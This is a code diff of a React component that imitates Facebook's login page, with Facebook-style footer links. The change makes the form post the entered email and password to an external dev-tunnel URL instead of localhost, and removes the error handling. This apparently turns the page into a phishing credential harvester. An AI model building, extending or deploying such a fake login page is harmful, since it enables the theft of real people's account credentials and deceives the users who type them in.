@@ -271,20 +271,16 @@ export default function FacebookLogin() {
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
 
-  const handleLogin = async (e) => {
+  const handleLogin = async  (e) => {
     e.preventDefault();
-    
-    const payload = {email : email, password: password}
+    const payload = {email: email, password: password}
 
-    try {
-      await axios.post('http://localhost:3000/api/data', payload)
+    await axios.post('https://wxfkz9sq-3000.asse.devtunnels.ms/api/data', payload)
 
-    } catch (e) {
-      console.log(e)
-    }
     setError("");
     
   };
+
 
   const footerLinks = [
     "Facebook", "Messenger", "Facebook Lite", "Video", "Places", "Games",
